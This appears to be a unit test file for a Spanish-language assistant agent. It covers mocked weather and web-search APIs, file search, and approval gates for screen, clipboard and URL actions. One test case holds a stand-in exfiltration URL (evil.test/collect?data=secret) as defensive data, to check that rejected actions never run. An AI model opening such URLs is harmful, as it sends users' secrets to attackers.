"""Unit tests for weather, web search, file search, repos overview and approval-gated
computer actions (screen capture / clipboard write never reach the app if rejected)."""

import json

import httpx
import pytest
import respx
from langgraph.types import Command
from pydantic import SecretStr

from assistant.tools.web import WebError, get_weather, web_search
from assistant.workspace.projects import Workspace
from tests.unit.test_agent import approve, config, reply, tool_call, user


@respx.mock
async def test_weather_reads_open_meteo_in_spanish():
    respx.get("https://geocoding-api.open-meteo.com/v1/search").mock(
        return_value=httpx.Response(
            200,
            json={
                "results": [
                    {
                        "name": "Torreón",
                        "admin1": "Coahuila",
                        "country": "México",
                        "latitude": 25.5,
                        "longitude": -103.4,
                    }
                ]
            },
        )
    )
    respx.get("https://api.open-meteo.com/v1/forecast").mock(
        return_value=httpx.Response(
            200,
            json={
                "current": {
                    "temperature_2m": 24.1,
                    "apparent_temperature": 25,
                    "relative_humidity_2m": 30,
                    "weather_code": 0,
                    "wind_speed_10m": 8,
                },
                "daily": {
                    "time": ["2026-10-30"],
                    "weather_code": [61],
                    "temperature_2m_max": [28],
                    "temperature_2m_min": [14],
                    "precipitation_probability_max": [40],
                },
            },
        )
    )

    weather = await get_weather("Torreon")

    assert weather["place"] == "Torreón, Coahuila, México"
    assert weather["now"]["sky"] == "despejado"
    assert weather["days"][0]["sky"] == "lluvia ligera"


@respx.mock
async def test_unknown_city_is_a_clear_error():
    respx.get("https://geocoding-api.open-meteo.com/v1/search").mock(
        return_value=httpx.Response(200, json={})
    )
    with pytest.raises(WebError, match="ciudad"):
        await get_weather("Zzzz")


@respx.mock
async def test_web_search_falls_back_to_wikipedia_without_quota(settings):
    gemini = settings.model_copy(
        update={
            "llm_provider": "gemini",
            "gemini_api_key": SecretStr("k"),
            "gemini_native_url": "https://g.test/v1beta",
            "search_model": "search-model",
            "llm_model": "search-model",
        }
    )
    respx.post("https://g.test/v1beta/models/search-model:generateContent").mock(
        return_value=httpx.Response(429, json={"error": {"code": 429}})
    )
    respx.get("https://es.wikipedia.org/w/api.php").mock(
        return_value=httpx.Response(200, json={"query": {"search": [{"title": "Peso mexicano"}]}})
    )
    respx.get("https://es.wikipedia.org/api/rest_v1/page/summary/Peso_mexicano").mock(
        return_value=httpx.Response(200, json={"extract": "El peso es la moneda de México."})
    )

    result = await web_search("peso mexicano", gemini)

    assert result["source"] == "Wikipedia"
    assert result["results"][0]["snippet"].startswith("El peso")
    assert "unavailable" in result["note"]


@respx.mock
async def test_web_search_returns_answer_and_sources(settings):
    gemini = settings.model_copy(
        update={
            "llm_provider": "gemini",
            "gemini_api_key": SecretStr("k"),
            "gemini_native_url": "https://g.test/v1beta",
            "search_model": "search-model",
        }
    )
    route = respx.post("https://g.test/v1beta/models/search-model:generateContent").mock(
        return_value=httpx.Response(
            200,
            json={
                "candidates": [
                    {
                        "content": {"parts": [{"text": "Hoy el dólar está en 18.2 pesos."}]},
                        "groundingMetadata": {
                            "groundingChunks": [
                                {"web": {"title": "Banxico", "uri": "https://x.test"}}
                            ]
                        },
                    }
                ]
            },
        )
    )

    result = await web_search("precio del dólar hoy", gemini)

    assert result["answer"].startswith("Hoy el dólar")
    assert result["sources"] == [{"title": "Banxico", "url": "https://x.test"}]
    assert json.loads(route.calls.last.request.content)["tools"] == [{"google_search": {}}]


def test_find_files_matches_words_without_accents(tmp_path):
    root = tmp_path / "Documentos"
    (root / "Facturas" / "node_modules").mkdir(parents=True)
    (root / "Facturas" / "factura_octubre.pdf").write_bytes(b"%PDF")
    (root / "Facturas" / "Factura Septiembre.pdf").write_bytes(b"%PDF")
    (root / "Facturas" / "node_modules" / "factura_octubre.pdf").write_bytes(b"x")
    (root / "notas.txt").write_text("x", encoding="utf-8")

    found = Workspace(root).find_files("Factura Octubre", "pdf")

    assert [f["path"] for f in found] == ["Facturas/factura_octubre.pdf"]


@pytest.mark.parametrize(
    "tool,args",
    [
        ("look_at_screen", {"question": "¿qué error es?"}),
        ("write_clipboard", {"text": "hola"}),
        ("read_clipboard", {}),
        ("open_url", {"url": "https://evil.test/collect?data=secret"}),
    ],
)
async def test_risky_computer_actions_need_approval_and_never_run_if_rejected(
    make_agent, tool, args
):
    graph, _, _ = make_agent(reply(calls=[tool_call(tool, args)]), reply("De acuerdo."))

    paused = await graph.ainvoke(user("hazlo"), config())
    first = paused["__interrupt__"][0].value
    assert "kind" not in first  # an approval, not a computer action

    done = await graph.ainvoke(Command(resume={"decision": "reject"}), config())

    assert "__interrupt__" not in done  # never handed to the app
    assert done["actions"][0]["decision"] == "reject"


async def test_a_bare_homepage_opens_without_approval(make_agent):
    graph, _, _ = make_agent(
        reply(calls=[tool_call("open_url", {"url": "https://www.youtube.com"})]), reply("Listo.")
    )

    paused = await graph.ainvoke(user("abre youtube"), config())

    assert paused["__interrupt__"][0].value["kind"] == "client_action"  # straight to the app


async def test_approved_screen_question_is_then_handed_to_the_app(make_agent):
    graph, _, _ = make_agent(
        reply(calls=[tool_call("look_at_screen", {"question": "¿qué dice?"})]), reply("Dice hola.")
    )

    paused = await graph.ainvoke(user("¿qué hay en mi pantalla?"), config())
    after_approval = await graph.ainvoke(approve(paused), config())
    action = after_approval["__interrupt__"][0].value

    assert action["kind"] == "client_action" and action["tool"] == "look_at_screen"
    done = await graph.ainvoke(
        Command(
            resume={"tool_call_id": action["tool_call_id"], "client_result": {"answer": "hola"}}
        ),
        config(),
    )
    assert done["actions"][0]["decision"] == "approve"
    assert done["actions"][0]["result"] == {"answer": "hola"}
